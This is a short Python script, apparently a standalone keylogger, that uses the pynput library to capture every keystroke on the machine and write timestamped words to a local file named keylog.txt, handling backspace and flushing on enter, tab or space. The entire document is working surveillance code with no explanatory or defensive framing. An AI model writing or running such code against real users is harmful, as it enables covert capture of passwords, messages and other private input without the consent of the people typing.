from pynput import keyboard
from datetime import datetime

log_file = "keylog.txt"
buffer = []

def on_press(key):
    try:
        character = key.char
    except AttributeError:
        character = f"[{key.name}]"

    if character == "[backspace]" and buffer:
        buffer.pop()
    elif character == "[enter]" or character == "[tab]" or character == "[space]":
        with open(log_file, "a") as f:
            f.write(f"{datetime.now()} - {''.join(buffer)}\n")
        buffer.clear()
    else:
        buffer.append(character)

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
